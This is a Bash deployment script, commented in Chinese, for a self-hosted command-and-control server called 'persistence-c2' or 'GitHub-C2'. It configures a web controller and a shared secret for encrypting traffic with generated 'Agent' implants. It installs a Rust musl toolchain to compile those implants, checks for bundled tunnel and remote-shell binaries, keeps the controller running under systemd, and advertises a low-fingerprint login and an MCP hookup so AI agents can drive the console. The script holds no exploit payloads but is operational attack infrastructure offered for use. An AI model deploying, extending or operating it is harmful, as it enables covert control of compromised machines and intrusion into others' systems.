#!/bin/bash
# ─────────────────────────────────────────────────────────────────────────────
# 自定义维权 C2（persistence-c2）源码仓一键部署脚本
#
# 用法：  git clone <本仓库> && cd persistence-c2 && bash deploy.sh
#        bash deploy.sh                          # 交互式填写账号/密码/通信 Secret
#        bash deploy.sh --user admin --pass '...' --c2-secret '...' --port 8080 --bind 0.0.0.0
#        bash deploy.sh --noninteractive          # 全部用默认值/env（无人值守）
#
# 自动识别三种运行位置：
#   ① git clone 后的仓库根（旁边有 c2/ 源码树）→ 直接部署 c2/
#   ② 本身就在 c2/ 目录里（升级场景）→ 直接部署
#   ③ 旁边有 c2-bundle.tar.gz（旧上传场景，可选）→ 先解压，再部署解压出的 c2/
# 幂等：重复执行=升级部署；数据库/日志/已设凭据保留（除非显式传新值）。
# ─────────────────────────────────────────────────────────────────────────────
set -euo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ── 0. 定位部署源目录（升级场景先快照，失败可回滚）─────────────────────────
SRC=""
ROLLBACK_TAR=""
ROLLBACK_DB=""
ROLLBACK_EXTRACT=""
if [ -f "$SELF_DIR/c2-bundle.tar.gz" ]; then
    info() { echo -e "\033[0;32m[+]\033[0m $*"; }
    # C6：覆盖前快照现有部署（保留最近 2 份），健康检查失败时自动回滚
    if [ -d "$SELF_DIR/c2/web-controller" ]; then
        SNAP_TS="$(date +%Y%m%d-%H%M%S)"
        ROLLBACK_TAR="$SELF_DIR/.rollback-${SNAP_TS}.tar.gz"
        ROLLBACK_DB="$SELF_DIR/.rollback-${SNAP_TS}.db"
        LIVE_DB="$SELF_DIR/c2/web-controller/c2_web.db"
        if [ -f "$LIVE_DB" ]; then
            if command -v sqlite3 >/dev/null 2>&1; then
                sqlite3 "$LIVE_DB" ".backup '$ROLLBACK_DB'" 2>/dev/null || ROLLBACK_DB=""
            elif [ -x "$SELF_DIR/c2/web-controller/venv/bin/python" ]; then
                "$SELF_DIR/c2/web-controller/venv/bin/python" -c \
                    "import sqlite3; s=sqlite3.connect(r'$LIVE_DB'); d=sqlite3.connect(r'$ROLLBACK_DB'); s.backup(d); d.close(); s.close()" \
                    2>/dev/null || ROLLBACK_DB=""
            else
                cp -f "$LIVE_DB" "$ROLLBACK_DB" 2>/dev/null || ROLLBACK_DB=""
            fi
            if [ -n "${ROLLBACK_DB:-}" ] && [ -f "$ROLLBACK_DB" ]; then
                info "已备份数据库 → $ROLLBACK_DB"
                ls -1t "$SELF_DIR"/.rollback-*.db 2>/dev/null | tail -n +3 | while read -r f; do rm -f "$f"; done
            fi
        fi
        tar czf "$ROLLBACK_TAR" -C "$SELF_DIR" \
            --exclude=c2/web-controller/venv \
            --exclude=c2/web-controller/c2_web.db \
            --exclude=c2/web-controller/c2_web.db-wal \
            --exclude=c2/web-controller/c2_web.db-shm \
            --exclude=c2/web-controller/downloads \
            --exclude=c2/logs \
            c2 2>/dev/null || ROLLBACK_TAR=""
        if [ -n "$ROLLBACK_TAR" ]; then
            info "已快照当前部署（健康检查失败时自动回滚代码+DB）"
            ls -1t "$SELF_DIR"/.rollback-*.tar.gz 2>/dev/null | tail -n +3 | while read -r f; do rm -f "$f"; done
        fi
    fi
    info "发现压缩包，解压 c2-bundle.tar.gz …"
    tar xzf "$SELF_DIR/c2-bundle.tar.gz" -C "$SELF_DIR"
    SRC="$SELF_DIR/c2"
elif [ -d "$SELF_DIR/web-controller" ]; then
    SRC="$SELF_DIR"                     # 已在解压后的 c2/ 内
elif [ -d "$SELF_DIR/c2/web-controller" ]; then
    SRC="$SELF_DIR/c2"
fi
[ -n "$SRC" ] || { echo "[-] 未找到 c2-bundle.tar.gz 或已解压的 c2/ 目录" >&2; exit 1; }
cd "$SRC"

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
die()  { echo -e "${RED}[-]${NC} $*" >&2; exit 1; }

# git pull / 在 c2/ 内升级：快照落到 SRC 的父目录，避免 rm -rf "$SRC" 把 tar 一起删掉。
if [ -z "$ROLLBACK_TAR" ] && [ -d "$SRC/web-controller" ]; then
    SNAP_PARENT="$(cd "$SRC/.." && pwd)"
    SNAP_NAME="$(basename "$(cd "$SRC" && pwd)")"
    if [ "$SRC" = "$SELF_DIR" ]; then
        ROLLBACK_EXTRACT="$SNAP_PARENT"
    else
        ROLLBACK_EXTRACT="$SELF_DIR"
    fi
    SNAP_TS="$(date +%Y%m%d-%H%M%S)"
    ROLLBACK_TAR="$ROLLBACK_EXTRACT/.rollback-${SNAP_TS}.tar.gz"
    ROLLBACK_DB="$ROLLBACK_EXTRACT/.rollback-${SNAP_TS}.db"
    LIVE_DB="$SRC/web-controller/c2_web.db"
    if [ -f "$LIVE_DB" ]; then
        if command -v sqlite3 >/dev/null 2>&1; then
            sqlite3 "$LIVE_DB" ".backup '$ROLLBACK_DB'" 2>/dev/null || ROLLBACK_DB=""
        elif [ -x "$SRC/web-controller/venv/bin/python" ]; then
            "$SRC/web-controller/venv/bin/python" -c \
                "import sqlite3; s=sqlite3.connect(r'$LIVE_DB'); d=sqlite3.connect(r'$ROLLBACK_DB'); s.backup(d); d.close(); s.close()" \
                2>/dev/null || ROLLBACK_DB=""
        else
            cp -f "$LIVE_DB" "$ROLLBACK_DB" 2>/dev/null || ROLLBACK_DB=""
        fi
        if [ -n "${ROLLBACK_DB:-}" ] && [ -f "$ROLLBACK_DB" ]; then
            info "已备份数据库 → $ROLLBACK_DB"
            ls -1t "$ROLLBACK_EXTRACT"/.rollback-*.db 2>/dev/null | tail -n +3 | while read -r f; do rm -f "$f"; done
        fi
    fi
    tar czf "$ROLLBACK_TAR" -C "$SNAP_PARENT" \
        --exclude="${SNAP_NAME}/web-controller/venv" \
        --exclude="${SNAP_NAME}/web-controller/c2_web.db" \
        --exclude="${SNAP_NAME}/web-controller/c2_web.db-wal" \
        --exclude="${SNAP_NAME}/web-controller/c2_web.db-shm" \
        --exclude="${SNAP_NAME}/web-controller/downloads" \
        --exclude="${SNAP_NAME}/logs" \
        "$SNAP_NAME" 2>/dev/null || ROLLBACK_TAR=""
    if [ -n "$ROLLBACK_TAR" ] && [ -f "$ROLLBACK_TAR" ]; then
        info "已快照当前部署（健康检查失败时自动回滚代码+DB）"
        ls -1t "$ROLLBACK_EXTRACT"/.rollback-*.tar.gz 2>/dev/null | tail -n +3 | while read -r f; do rm -f "$f"; done
    fi
fi

# ── 1. 参数解析 ─────────────────────────────────────────────────────────────
OPT_USER="" OPT_PASS="" OPT_PORT="" OPT_BIND="" OPT_C2="" NONINTERACTIVE=0
# source .runtime.env 之前先留住本次调用传入的 C2_PASSWORD，避免被旧文件盖掉
PRE_C2="${C2_PASSWORD:-}"
while [[ $# -gt 0 ]]; do
    case "$1" in
        --user)  OPT_USER="$2"; shift 2 ;;
        --pass)  OPT_PASS="$2"; shift 2 ;;
        --c2-secret) OPT_C2="$2"; shift 2 ;;
        --port)  OPT_PORT="$2"; shift 2 ;;
        --bind)  OPT_BIND="$2";  shift 2 ;;
        --noninteractive) NONINTERACTIVE=1; shift ;;
        --skip-toolchain) export SKIP_TOOLCHAIN=1; shift ;;
        --skip-always-poll) export SKIP_ALWAYS_POLL=1; shift ;;
        --no-systemd) export C2_NO_SYSTEMD=1; shift ;;
        *) die "未知参数 $1（--user/--pass/--c2-secret/--port/--bind/--noninteractive/--skip-toolchain/--skip-always-poll/--no-systemd）" ;;
    esac
done

echo "=================================================="
echo "  GitHub-C2  一键部署"
echo "=================================================="

# ── 2. Python3 ──────────────────────────────────────────────────────────────
if ! command -v python3 >/dev/null 2>&1; then
    warn "python3 未安装，尝试 apt 安装…"
    command -v apt-get >/dev/null 2>&1 && apt-get update -q && apt-get install -y python3 python3-venv python3-pip \
        || die "请先手动安装 python3 + python3-venv"
fi
PYTHON="$(command -v python3)"
info "Python: $($PYTHON --version 2>&1)"

# ── 3. venv + 依赖 ──────────────────────────────────────────────────────────
VENV="$SRC/web-controller/venv"
if [[ ! -x "$VENV/bin/python" ]]; then
    info "创建虚拟环境…"
    "$PYTHON" -m venv "$VENV" || die "venv 创建失败（Debian/Ubuntu 需要 python3-venv 包）"
fi
info "安装 Python 依赖…"
"$VENV/bin/pip" install -q --upgrade pip
"$VENV/bin/pip" install -q -r "$SRC/web-controller/requirements.txt"

# ── 4. 凭据（参数 > 旧值 > 交互输入；重部署不改密码则回车沿用）────────────
# 用 source 读旧值：.runtime.env 是 printf %q 写的，grep/cut 会把引号当正文。
OLD_USER=""; OLD_PASS=""; OLD_PORT=""; OLD_BIND=""; OLD_ALWAYS=""; OLD_C2=""
ENVFILE="$SRC/.runtime.env"
if [[ -f "$ENVFILE" ]]; then
    set -a
    # shellcheck disable=SC1090
    . "$ENVFILE"
    set +a
    OLD_USER="${WEB_USERNAME:-}"
    OLD_PASS="${WEB_PASSWORD:-}"
    OLD_PORT="${C2_PORT:-}"
    OLD_BIND="${C2_BIND:-}"
    OLD_ALWAYS="${C2_ALWAYS_POLL:-}"
    OLD_C2="${C2_PASSWORD:-}"
fi

C2_SECRET=""
C2_SECRET_CHANGED=0
if [[ $NONINTERACTIVE -eq 1 ]]; then
    USER_NAME="${OPT_USER:-${OLD_USER:-admin}}"
    USER_PASS="${OPT_PASS:-${C2_WEB_PASS:-}}"
    [[ -n "$USER_PASS" ]] || die "无人值守模式需要 --pass 或环境变量 C2_WEB_PASS"
    if [[ -n "$OPT_C2" ]]; then
        C2_SECRET="$OPT_C2"
        C2_SECRET_CHANGED=1
    elif [[ -n "$PRE_C2" && ( -z "$OLD_C2" || "$PRE_C2" != "$OLD_C2" ) ]]; then
        C2_SECRET="$PRE_C2"
        C2_SECRET_CHANGED=1
    else
        C2_SECRET="${OLD_C2:-$PRE_C2}"
        C2_SECRET_CHANGED=0
    fi
    if [[ -z "$C2_SECRET" ]]; then
        warn "无人值守未设置通信加密 Secret（--c2-secret 或 C2_PASSWORD）。编包前请到 Settings 填一次。"
    fi
else
    if [[ -n "$OPT_USER" ]]; then USER_NAME="$OPT_USER";
    else
        PROMPT="Web 登录用户名"
        [[ -n "$OLD_USER" ]] && PROMPT+=" [回车沿用: $OLD_USER]"
        read -r -p "$PROMPT: " USER_NAME
        USER_NAME="${USER_NAME:-$OLD_USER}"
    fi
    [[ -n "$USER_NAME" ]] || die "用户名不能为空"

    if [[ -n "$OPT_PASS" ]]; then USER_PASS="$OPT_PASS";
    else
        PROMPT="Web 登录密码（输入不回显）"
        [[ -n "$OLD_PASS" ]] && PROMPT+=" [回车沿用旧密码]"
        read -r -s -p "$PROMPT: " USER_PASS; echo
        USER_PASS="${USER_PASS:-$OLD_PASS}"
    fi
    [[ -n "$USER_PASS" ]] || die "密码不能为空"

    # 通信加密 Secret（编包装进 Agent，控制器用来加解密指令）。写入数据库后编包不必再填。
    if [[ -n "$OPT_C2" ]]; then
        C2_SECRET="$OPT_C2"
        C2_SECRET_CHANGED=1
    else
        PROMPT="通信加密 Secret（编包/解密共用，输入不回显）"
        [[ -n "$OLD_C2" ]] && PROMPT+=" [回车沿用已保存]"
        read -r -s -p "$PROMPT: " C2_IN; echo
        if [[ -n "$C2_IN" ]]; then
            C2_SECRET="$C2_IN"
            C2_SECRET_CHANGED=1
        else
            C2_SECRET="$OLD_C2"
            C2_SECRET_CHANGED=0
        fi
    fi
    if [[ -z "$C2_SECRET" ]]; then
        warn "未设置通信加密 Secret。编包前请到 Settings「控制器解密密码」填一次，之后会写入数据库。"
    fi

    # 端口与绑定地址（回车=沿用旧值/默认）
    if [[ -n "$OPT_PORT" ]]; then PORT="$OPT_PORT";
    else
        PROMPT="监听端口"
        [[ -n "$OLD_PORT" ]] && PROMPT+=" [回车沿用: $OLD_PORT]" || PROMPT+=" [回车=8080]"
        read -r -p "$PROMPT: " PORT_IN
        PORT="${PORT_IN:-${OLD_PORT:-8080}}"
    fi
    [[ "$PORT" =~ ^[0-9]+$ ]] && [ "$PORT" -ge 1 ] && [ "$PORT" -le 65535 ] \
        || die "端口无效：$PORT（1-65535）"

    if [[ -n "$OPT_BIND" ]]; then BIND="$OPT_BIND";
    else
        PROMPT="绑定地址（0.0.0.0=所有网卡，127.0.0.1=仅本机）"
        [[ -n "$OLD_BIND" ]] && PROMPT+=" [回车沿用: $OLD_BIND]"
        read -r -p "$PROMPT: " BIND_IN
        BIND="${BIND_IN:-${OLD_BIND:-0.0.0.0}}"
    fi
fi

if [[ $NONINTERACTIVE -eq 1 ]]; then
    PORT="${OPT_PORT:-${OLD_PORT:-8080}}"
    BIND="${OPT_BIND:-${OLD_BIND:-0.0.0.0}}"
    [[ "$PORT" =~ ^[0-9]+$ ]] && [ "$PORT" -ge 1 ] && [ "$PORT" -le 65535 ] \
        || die "端口无效：$PORT（1-65535）"
fi

# ── 5. 运行时环境文件（凭据/端口/DB 密钥；0600；DB 密钥首次生成后沿用）────
DB_KEY="${C2_DB_KEY:-}"
[[ -n "$DB_KEY" ]] || DB_KEY="$("$VENV/bin/python" -c 'import secrets;print(secrets.token_hex(32))')"

# C2_ALWAYS_POLL：默认 1（浏览器关了后台也持续轮询）。SKIP_ALWAYS_POLL=1 或
# --skip-always-poll 关掉。已有 env 里的显式值优先于默认。
if [[ "${SKIP_ALWAYS_POLL:-0}" == "1" ]]; then
    ALWAYS_POLL=0
elif [[ -n "$OLD_ALWAYS" ]]; then
    ALWAYS_POLL="$OLD_ALWAYS"
else
    ALWAYS_POLL="${C2_ALWAYS_POLL:-1}"
fi

# 回车沿用时：若 Settings 已经改过通信 Secret，用库里的值写回 .runtime.env，避免旧 env 覆盖新库。
LIVE_DB="$SRC/web-controller/c2_web.db"
if [[ "$C2_SECRET_CHANGED" -eq 0 && -f "$LIVE_DB" ]]; then
    DB_C2="$("$VENV/bin/python" -c "
import sqlite3, sys
c = sqlite3.connect(sys.argv[1])
r = c.execute(\"SELECT value FROM config WHERE key='password'\").fetchone()
print(r[0] if r and r[0] else '', end='')
" "$LIVE_DB" 2>/dev/null || true)"
    if [[ -n "$DB_C2" ]]; then
        C2_SECRET="$DB_C2"
    fi
fi

mkdir -p "$SRC/logs"
umask 177
# %q 引用：值可含空格/引号/特殊字符，source 时原样还原
{
    printf '# 由 deploy.sh 生成 — 含凭据，权限 0600，勿提交版本库\n'
    printf 'WEB_USERNAME=%q\n' "$USER_NAME"
    printf 'WEB_PASSWORD=%q\n' "$USER_PASS"
    printf 'C2_BIND=%q\n'      "$BIND"
    printf 'C2_PORT=%q\n'      "$PORT"
    printf 'C2_DB_KEY=%q\n'    "$DB_KEY"
    printf 'C2_ALWAYS_POLL=%q\n' "$ALWAYS_POLL"
    printf 'C2_PASSWORD=%q\n'  "$C2_SECRET"
} > "$ENVFILE"
chmod 600 "$ENVFILE"
umask 022
info "凭据已写入 $ENVFILE (0600)  C2_ALWAYS_POLL=$ALWAYS_POLL"
if [[ -n "$C2_SECRET" ]]; then
    info "通信加密 Secret 已写入运行时环境（编包留空即沿用）"
fi

# 显式改过 Secret，或库里还没有：立刻写入 SQLite（控制器未首次启动时库可能还不存在）。
if [[ -n "$C2_SECRET" && -f "$LIVE_DB" ]]; then
    NEED_DB_WRITE=0
    if [[ "$C2_SECRET_CHANGED" -eq 1 ]]; then
        NEED_DB_WRITE=1
    else
        HAS_DB_PW="$("$VENV/bin/python" -c "
import sqlite3, sys
c = sqlite3.connect(sys.argv[1])
r = c.execute(\"SELECT value FROM config WHERE key='password'\").fetchone()
print('1' if r and (r[0] or '').strip() else '0', end='')
" "$LIVE_DB" 2>/dev/null || echo 0)"
        [[ "$HAS_DB_PW" == "1" ]] || NEED_DB_WRITE=1
    fi
    if [[ "$NEED_DB_WRITE" -eq 1 ]]; then
        "$VENV/bin/python" -c "
import sqlite3, sys
c = sqlite3.connect(sys.argv[1])
pw = sys.argv[2]
c.execute('INSERT OR REPLACE INTO config(key,value) VALUES(?,?)', ('password', pw))
c.execute('INSERT OR REPLACE INTO config(key,value) VALUES(?,?)', ('builder_password', pw))
c.commit()
" "$LIVE_DB" "$C2_SECRET" \
        && info "通信加密 Secret 已写入数据库（Settings + 编包共用）" \
        || warn "写入数据库失败，控制器首次启动时会从 C2_PASSWORD 再落库"
    fi
fi

# Web 登录：env 与库必须一致，否则健康检查用 env、控制器读库会假失败并误回滚。
if [[ -n "$USER_NAME" && -n "$USER_PASS" && -f "$LIVE_DB" ]]; then
    "$VENV/bin/python" -c "
import sqlite3, sys
c = sqlite3.connect(sys.argv[1])
c.execute('INSERT OR REPLACE INTO config(key,value) VALUES(?,?)', ('web_username', sys.argv[2]))
c.execute('INSERT OR REPLACE INTO config(key,value) VALUES(?,?)', ('web_password', sys.argv[3]))
c.commit()
" "$LIVE_DB" "$USER_NAME" "$USER_PASS" \
        && info "Web 登录凭据已写入数据库（与 .runtime.env 对齐）" \
        || warn "写入 Web 凭据到数据库失败 — 健康检查可能对不上"
fi

# ── 6. 预编译二进制完整性（隧道 / WS Shell 服务端）─────────────────────────
for bin_rel in stowaway/stowaway_admin cliws/cliws; do
    bin_path="$SRC/web-controller/$bin_rel"
    if [[ -x "$bin_path" ]]; then
        info "二进制就绪：$bin_rel"
    else
        chmod +x "$bin_path" 2>/dev/null || warn "缺少 $bin_rel —— Tunnel / WS Shell 功能不可用（控制器其余功能正常）"
    fi
done

# ── 7. Agent 编译环境（生成器必需：没有它点"生成 Agent"只会报错）───────────
# 自动安装：gcc/binutils（musl 链接器 + strip）→ rustup（若无 cargo）→ musl target。
# 交互模式自动装；无人值守需 C2_INSTALL_TOOLCHAIN=1；SKIP_TOOLCHAIN=1 永远跳过。
if [[ "${SKIP_TOOLCHAIN:-0}" == "1" ]]; then
    warn "按要求跳过 Agent 编译环境 —— 生成器将无法编译 Agent"
elif [[ $NONINTERACTIVE -eq 1 && "${C2_INSTALL_TOOLCHAIN:-0}" != "1" ]]; then
    warn "无人值守模式默认不装 Rust（需网络，约 1-2 分钟）。要装：C2_INSTALL_TOOLCHAIN=1 bash deploy.sh --noninteractive"
else
    if ! command -v gcc >/dev/null 2>&1 || ! command -v strip >/dev/null 2>&1; then
        info "安装编译基础（gcc / binutils）…"
        (command -v apt-get >/dev/null 2>&1 && apt-get update -q && apt-get install -y -q gcc binutils) \
        || (command -v yum >/dev/null 2>&1 && yum install -y gcc binutils) \
        || warn "gcc/binutils 安装失败 —— Agent 编译可能缺链接器"
    fi
    if command -v cargo >/dev/null 2>&1; then
        info "Rust: $(cargo --version 2>/dev/null | head -1)"
    else
        info "安装 Rust 工具链（rustup，minimal profile，约 1-2 分钟）…"
        RUSTUP_INIT="$(mktemp /tmp/rustup-init.XXXXXX.sh)"
        if curl --proto '=https' --tlsv1.2 -fsSL -o "$RUSTUP_INIT" https://sh.rustup.rs \
           && [ "$(wc -c < "$RUSTUP_INIT")" -gt 10000 ]; then
            sh "$RUSTUP_INIT" -y --profile minimal --default-toolchain stable >/dev/null 2>&1 || true
            # shellcheck disable=SC1091
            [ -f "$HOME/.cargo/env" ] && . "$HOME/.cargo/env"
            export PATH="$HOME/.cargo/bin:$PATH"
            info "Rust 安装完成：$(cargo --version 2>/dev/null || echo '重新登录后 PATH 生效')"
        else
            warn "rustup 下载失败（网络?）—— 生成器暂不可用，可稍后手动安装"
        fi
        rm -f "$RUSTUP_INIT"
    fi
    if command -v rustup >/dev/null 2>&1; then
        if rustup target list --installed 2>/dev/null | grep -q x86_64-unknown-linux-musl; then
            info "musl 编译目标就绪"
        else
            info "安装 musl 编译目标…"
            rustup target add x86_64-unknown-linux-musl || warn "musl target 安装失败 —— 生成器编译会报错"
        fi
    fi
fi

# ── 8. 启动（systemd 优先；否则 5 秒 respawn 循环）────────────────────────
APP_PY="$SRC/web-controller/app.py"
RUNNER="$SRC/run-controller.sh"
UNIT_NAME="c2-controller"
UNIT_PATH=""
USED_SYSTEMD=0

chmod +x "$RUNNER" 2>/dev/null || true
[[ -x "$RUNNER" ]] || die "缺少 $RUNNER（bundle 不完整）"

# 进程已停时可以直接改名。运行中靠 logrotate copytruncate。
if [[ -f "$SRC/logs/controller.log" ]]; then
    _log_sz="$(wc -c < "$SRC/logs/controller.log" 2>/dev/null || echo 0)"
    if [[ "$_log_sz" -gt 20971520 ]]; then
        mv -f "$SRC/logs/controller.log" "$SRC/logs/controller.log.$(date +%Y%m%d-%H%M%S)"
        ls -1t "$SRC/logs"/controller.log.* 2>/dev/null | tail -n +6 | while read -r old; do rm -f "$old"; done
        info "controller.log 已轮转（超过 20MiB）"
    fi
fi
if [[ "$(id -u)" -eq 0 ]] && [[ -d /etc/logrotate.d ]]; then
    cat > /etc/logrotate.d/c2-controller <<EOF
$SRC/logs/controller.log {
    weekly
    rotate 8
    size 20M
    missingok
    notifempty
    copytruncate
    compress
}
EOF
fi

_stop_controller() {
    if command -v systemctl >/dev/null 2>&1; then
        systemctl stop "$UNIT_NAME" 2>/dev/null || true
        systemctl --user stop "$UNIT_NAME" 2>/dev/null || true
    fi
    if [[ -f "$SRC/logs/controller.pid" ]]; then
        kill "$(cat "$SRC/logs/controller.pid")" 2>/dev/null || true
        sleep 1
    fi
    pkill -f "$VENV/bin/python $APP_PY" 2>/dev/null || true
    pkill -f "$RUNNER --respawn" 2>/dev/null || true
    sleep 1
}

_install_systemd_unit() {
    [[ "${C2_NO_SYSTEMD:-0}" == "1" ]] && return 1
    command -v systemctl >/dev/null 2>&1 || return 1
    [[ -d /run/systemd/system ]] || return 1

    local dest scope
    if [[ "$(id -u)" -eq 0 ]]; then
        dest="/etc/systemd/system/${UNIT_NAME}.service"
        scope=""
    else
        mkdir -p "$HOME/.config/systemd/user"
        dest="$HOME/.config/systemd/user/${UNIT_NAME}.service"
        scope="--user"
    fi
    local wanted="multi-user.target"
    [[ -n "$scope" ]] && wanted="default.target"
    cat > "$dest" <<EOF
[Unit]
Description=GitHub-C2 web controller
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
WorkingDirectory=$SRC
ExecStart=/bin/bash $RUNNER --once
Restart=always
RestartSec=5
KillMode=mixed
StandardOutput=append:$SRC/logs/controller.log
StandardError=append:$SRC/logs/controller.log

[Install]
WantedBy=$wanted
EOF
    if [[ -n "$scope" ]]; then
        systemctl --user daemon-reload
        systemctl --user enable "$UNIT_NAME" >/dev/null
        systemctl --user restart "$UNIT_NAME"
    else
        systemctl daemon-reload
        systemctl enable "$UNIT_NAME" >/dev/null
        systemctl restart "$UNIT_NAME"
    fi
    UNIT_PATH="$dest"
    USED_SYSTEMD=1
}

_start_respawn() {
    set -a
    # shellcheck disable=SC1090
    . "$ENVFILE"
    set +a
    setsid nohup /bin/bash "$RUNNER" --respawn \
        > "$SRC/logs/respawn.log" 2>&1 < /dev/null &
    disown
}

info "停止本部署的旧控制器实例…"
_stop_controller

info "启动控制器（$BIND:$PORT）…"
if _install_systemd_unit; then
    info "已交给 systemd 守护（Restart=always / 5s） unit=$UNIT_PATH"
else
    _start_respawn
    info "无 systemd：已用 5 秒 respawn 循环拉起"
fi
sleep 3

# ── 9. 健康检查：登录 302 + /api/stats JSON（不是未认证 200 空页）────────
IP="$(hostname -I 2>/dev/null | awk '{print $1}')"
[[ -n "$IP" ]] || IP="<服务器IP>"

# curl → wget → /dev/tcp。缺 curl 不再把空结果当成 HTTP 000。
_http_code() {
    local url="$1"; shift
    if command -v curl >/dev/null 2>&1; then
        curl -sS -o /dev/null -w '%{http_code}' --max-time 5 "$@" "$url" 2>/dev/null || echo "000"
    elif command -v wget >/dev/null 2>&1; then
        local hdr
        hdr="$(wget -q -S -O /dev/null --timeout=5 "$@" "$url" 2>&1 || true)"
        echo "$hdr" | awk '/^  HTTP\//{code=$2} END{print (code==""?"000":code)}'
    elif timeout 2 bash -c "echo >/dev/tcp/127.0.0.1/$PORT" 2>/dev/null; then
        echo "TCP"
    else
        echo "000"
    fi
}

# 跟重定向拿 session cookie，再打 /api/stats。失败登录不会有 session，stats 会 401。
_health_console() {
    "$VENV/bin/python" - "$PORT" <<'PY'
import json, sys, urllib.error, urllib.parse, urllib.request, http.cookiejar, os

port = sys.argv[1]
base = f"http://127.0.0.1:{port}"
user = os.environ["WEB_USERNAME"]
pwd  = os.environ["WEB_PASSWORD"]
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
data = urllib.parse.urlencode({"username": user, "password": pwd}).encode()
req = urllib.request.Request(base + "/login", data=data, method="POST")
try:
    opener.open(req, timeout=8)
except urllib.error.HTTPError as e:
    raise SystemExit(f"login HTTP {e.code}")
except urllib.error.URLError as e:
    raise SystemExit(f"login connect: {e}")
if not any("session" in (c.name or "").lower() for c in cj):
    raise SystemExit("login did not set session cookie")
try:
    with opener.open(base + "/api/stats", timeout=8) as r:
        if r.status != 200:
            raise SystemExit(f"stats HTTP {r.status}")
        js = json.loads(r.read().decode())
        if "agents_total" not in js:
            raise SystemExit("stats JSON missing agents_total")
except urllib.error.HTTPError as e:
    raise SystemExit(f"stats HTTP {e.code}")
print("ok")
PY
}

set -a
# shellcheck disable=SC1090
. "$ENVFILE"
set +a

HEALTH_ERR=""
for _i in 1 2 3 4 5 6 7 8; do
    if HEALTH_ERR="$(_health_console 2>&1)"; then
        HEALTH_ERR=""
        break
    fi
    sleep 2
done

_do_rollback() {
    local why="$1"
    warn "健康检查失败（$why）——自动回滚到快照…"
    _stop_controller
    sleep 2
    rm -rf "$SRC"
    tar xzf "$ROLLBACK_TAR" -C "${ROLLBACK_EXTRACT:-$SELF_DIR}"
    if [ -n "${ROLLBACK_DB:-}" ] && [ -f "$ROLLBACK_DB" ]; then
        cp -f "$ROLLBACK_DB" "$SRC/web-controller/c2_web.db"
        rm -f "$SRC/web-controller/c2_web.db-wal" "$SRC/web-controller/c2_web.db-shm"
        info "已还原升级前数据库"
    fi
    rm -f "$ROLLBACK_TAR"
    chmod +x "$SRC/run-controller.sh" 2>/dev/null || true
    if ! _install_systemd_unit; then
        _start_respawn
    fi
    sleep 5
    set -a; . "$ENVFILE"; set +a
    if _health_console >/dev/null 2>&1; then
        info "已回滚到升级前版本并恢复运行（本次升级未生效，请检查新包）"
        exit 1
    fi
    die "回滚后仍未恢复。人工排查：tail -50 $SRC/logs/controller.log"
}

if [[ -n "$HEALTH_ERR" ]]; then
    ALIVE="$(_http_code "http://127.0.0.1:$PORT/")"
    if [ -n "$ROLLBACK_TAR" ] && [ -f "$ROLLBACK_TAR" ]; then
        _do_rollback "$HEALTH_ERR / probe=$ALIVE"
    fi
    die "健康检查失败（$HEALTH_ERR）。查看日志：tail -50 $SRC/logs/controller.log"
fi
if [ -n "$ROLLBACK_TAR" ] && [ -f "$ROLLBACK_TAR" ]; then
    ls -1t "$SELF_DIR"/.rollback-*.tar.gz 2>/dev/null | tail -n +2 | while read -r f; do rm -f "$f"; done
fi
if [ -n "${ROLLBACK_DB:-}" ] && [ -f "$ROLLBACK_DB" ]; then
    ls -1t "$SELF_DIR"/.rollback-*.db 2>/dev/null | tail -n +2 | while read -r f; do rm -f "$f"; done
fi
info "健康检查通过（登录 + /api/stats 可用）"

GUARD="respawn 循环 5s（无 systemd）"
[[ $USED_SYSTEMD -eq 1 ]] && GUARD="systemd $UNIT_NAME（崩了自拉起）"

echo -e "${CYAN}"
echo "=================================================="
echo " 部署完成 ✓"
echo " 浏览器打开（URL 参数登录，页面零指纹）："
echo "   http://$IP:$PORT/?login=$USER_NAME&pass=<你的密码>"
echo " 守护：$GUARD"
echo " 后台轮询：C2_ALWAYS_POLL=$ALWAYS_POLL（=0 则浏览器 90s 安静后停扫）"
echo " 数据/日志："
echo "   DB   web-controller/c2_web.db（升级快照含 sqlite backup）"
echo "   日志 logs/controller.log（20MiB 轮转 / logrotate copytruncate）"
echo " MCP：左侧栏 控制台工具 → 🤖 MCP 接入 可一键复制给 AI agent 的说明"
echo " 升级：本地跑 deploy/c2/make_bundle.sh → 上传新的 deploy.sh +"
echo "       c2-bundle.tar.gz → bash deploy.sh（回车沿用旧凭据）"
echo "=================================================="
echo -e "${NC}"
